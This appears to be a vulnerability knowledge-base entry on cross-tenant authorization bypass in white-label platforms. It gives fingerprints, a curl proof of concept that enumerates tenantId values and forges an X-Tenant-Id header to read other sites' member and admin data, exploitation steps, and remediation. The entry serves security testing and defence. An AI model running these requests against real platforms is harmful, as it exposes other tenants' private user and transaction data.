---
title: Multi-tenant authorization bypass in turnkey platforms (enumerate tenantId/siteId across dozens of sites)
cve: None (business logic)
severity: critical
cvss: 9.2
product: Turnkey/white-label system (one backend hosts multiple sites)
versions: Any
ports: 80, 443
keywords: multi-tenant, tenant, siteId, turnkey platform, white label, broken access control
entry: tenantId / siteId / merchantId in request bodies or Headers
verified: false
sources: Compiled from public sources (business logic; no CVE)
---

## Fingerprints

- Login pages/API responses contain `siteId`, `tenantId`, `merchantId`, `brandId`;
- One backend can switch among multiple domains (white label).

## Prerequisites

- A regular account on any site; ability to capture requests containing tenant fields.

## PoC

```bash
# 1) Confirm your own tenant id
curl -s https://a.target.com/api/user/info -H "Authorization: Bearer <t>" | jq '.data.siteId,.data.tenantId'

# 2) Change the tenant to read another site's data
for sid in 1 2 3 10 100; do
  echo "== tenant $sid"
  curl -s "https://a.target.com/api/report/member?tenantId=$sid&page=1&size=5" \
    -H "Authorization: Bearer <t>" | head -c 200; echo
done
# Result: another site's members/transactions returned = confirmed

# 3) Bypass with the X-Tenant header (some systems trust only the Header)
curl -s https://a.target.com/api/admin/config -H "Authorization: Bearer <t>" -H "X-Tenant-Id: 2"
```

## Exploitation Steps

1. Read your own tenant fields first (baseline);
2. Change the id to read reports/members (read-only);
3. Success means "dozens of sites on one turnkey platform exposed" — state the site count in the report;
4. Evidence: differences between two responses for different tenantId values (redacted).

## Remediation and Mitigation

- Derive tenant id from the token; prohibit request-body/header input; add tenant filters to all queries;
- Audit and alert on cross-tenant access.

## References

- OWASP API1 BOLA; multi-tenant isolation flaws (CWE-639).
